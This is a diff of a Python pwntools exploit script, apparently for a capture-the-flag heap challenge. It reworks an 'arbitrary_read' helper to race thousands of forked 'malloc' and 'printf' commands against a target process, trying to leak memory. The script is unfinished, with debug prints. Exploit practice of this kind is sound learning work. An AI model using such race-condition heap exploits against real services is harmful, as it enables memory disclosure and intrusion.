@@ -80,24 +80,30 @@ def controlled_allocations(r1, r2, addr, heap_base_addr):
 			break
 	
 	print("yo 1")
-	r1.sendline(f"malloc {idx + 1}".encode()) # gets B (returned at injected address's location
+	#r1.sendline(f"malloc {idx + 1}".encode()) # gets B (returned at injected address's location
 	print("yo 2")
 	r1.clean()
 	print("yo 3")
 	idx += 2
 
 def arbitrary_read(r1, r2, addr, heap_base_addr):
-	controlled_allocations(r1, r2, addr, heap_base_addr)
-	r1.sendline(f"printf {idx - 1}".encode())
-
-	r1.readuntil(b"MESSAGE: ")
-	output = r1.readline()[:-1]
 	
+	if os.fork() == 0:
+		for _ in range(10000):
+			r1.sendline(f"malloc {idx - 1}".encode()) 
+		exit(0)
+	else: 
+		for _ in range(10000):
+			r2.sendline(f"printf {idx - 1}".encode())
+		os.wait()
 
-	leak = u64(output.ljust(8, b'\x00')) 
-
-
-	return leak
+	output_set = set(r2.clean().splitlines())
+	# .clean() gets the output
+	# .splitlines() split the output by lines
+	# set() gets the unique lines
+	print(output_set)
+	
+	return 0
 	
 	
 	
